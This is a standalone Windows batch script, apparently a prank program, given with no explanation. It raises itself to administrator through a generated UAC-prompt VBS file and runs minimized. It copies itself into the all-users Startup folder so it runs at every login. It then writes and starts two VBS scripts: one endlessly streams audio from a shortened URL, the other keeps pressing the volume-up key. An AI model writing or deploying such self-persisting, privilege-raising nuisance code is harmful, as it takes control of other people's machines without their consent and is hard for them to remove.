set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
if "%1" == "" start "" /min "%~dpnx0" MY_FLAG && exit
@echo off
copy %~dpnx0 "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\userlogin.bat"
del %tmp%\rickyou.vbs
del %tmp%\volup.vbs
cd %tmp%
echo While true > rickyou.vbs
echo Dim oPlayer >> rickyou.vbs
echo Set oPlayer = CreateObject("WMPlayer.OCX") >> rickyou.vbs
echo oPlayer.URL = "http://tinyurl.com/s63ve48" >> rickyou.vbs
echo oPlayer.controls.play >> rickyou.vbs
echo While oPlayer.playState ^<^> 1 ' 1 = Stopped >> rickyou.vbs
echo WScript.Sleep 1 >> rickyou.vbs
echo Wend >> rickyou.vbs
echo oPlayer.close >> rickyou.vbs
echo Wend >> rickyou.vbs
timeout 1
echo volup.vbs
echo do > volup.vbs
echo Set WshShell = CreateObject("WScript.Shell") >> volup.vbs
echo WshShell.SendKeys(chr(^&hAF)) >> volup.vbs
echo loop >> volup.vbs
start rickyou.vbs && volup.vbs
exit